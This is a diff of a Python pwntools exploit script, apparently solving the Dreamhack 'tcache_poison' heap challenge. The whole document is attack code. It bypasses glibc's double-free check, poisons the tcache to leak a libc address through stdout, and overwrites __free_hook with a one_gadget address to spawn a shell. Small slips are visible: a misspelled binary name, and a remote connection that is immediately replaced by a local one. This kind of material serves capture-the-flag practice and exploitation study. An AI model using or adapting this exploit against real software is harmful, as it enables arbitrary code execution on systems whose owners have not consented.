@@ -1,34 +1,66 @@
 from pwn import *
+import warnings
 
-p = process('./tcache_poison')
+warnings.filterwarnings( 'ignore' )
 
-def allocate(size, data):
-  p.sendline(b"1")
-  p.sendlineafter(b"Size: ", str(size).encode)
-  p.sendlineafter(b"Content: ", data)
+p = remote('host3.dreamhack.games', '15909')
+p = process('./tcache_posion')
+e = ELF("./tcache_poison")
+libc = ELF("./libc-2.27.so")
+
+def alloc(size, data):
+    p.sendlineafter("Edit\n", "1")
+    p.sendlineafter(":", str(size))
+    p.sendafter(":", data)
 
 def free():
-  p.sendline(b"2")
+    p.sendlineafter("Edit\n", "2")
 
-def prt():
-  p.sendline(b"3")
+def print_chunk():
+    p.sendlineafter("Edit\n", "3")
 
 def edit(data):
-  p.sendline(b"4")
-  p.sendlineafter(b"chunk: ", data)
+    p.sendlineafter("Edit\n", "4")
+    p.sendafter(":", data)
 
-allocate(0x20, b"l0ux503n")
+# Allocate a chunk of size 0x40
+alloc(0x30, "dreamhack")
 free()
 
-edit(b"A"*8 + "\x00")
+# tcache[0x40]: "dreamhack"
+# Bypass the DFB mitigation
+edit("A"*8 + "\x00")
 free()
 
-addr_stdout = e.symbols['stdout']
-allocate(0x20, p64(addr_stdout))
+# tcache[0x40]: "dreamhack" -> "dreamhack"
+# Append the address of `stdout` to tcache[0x40]
+addr_stdout = e.symbols["stdout"]
+alloc(0x30, p64(addr_stdout))
 
-allocate(0x20, b"A"*8)
-allocate(0x20, b"\x60")
+# tcache[0x40]: "dreamhack" -> stdout -> _IO_2_1_stdout_ -> ...
+# Leak the value of stdout
+alloc(0x30, "B"*8)          # "dreamhack"
+alloc(0x30, "\x60")         # stdout
 
-prt()
+# Libc leak
+print_chunk()
+p.recvuntil("Content: ")
+stdout = u64(p.recv(6).ljust(8, b"\x00"))
+lb = stdout - libc.symbols["_IO_2_1_stdout_"]
+fh = lb + libc.symbols["__free_hook"]
+og = lb + 0x4f432
+success("free_hook :"+hex(fh))
+success("one_gadget :"+hex(og))
 
+# Overwrite the `__free_hook` with the address of one_gadget
+alloc(0x40, "dreamhack")
+free()
+edit("C"*8 + "\x00")
+free()
+alloc(0x40, p64(fh))
+alloc(0x40, "D"*8)
+alloc(0x40, p64(og))
+
+# Call `free()` to get shell
+free()
 p.interactive()
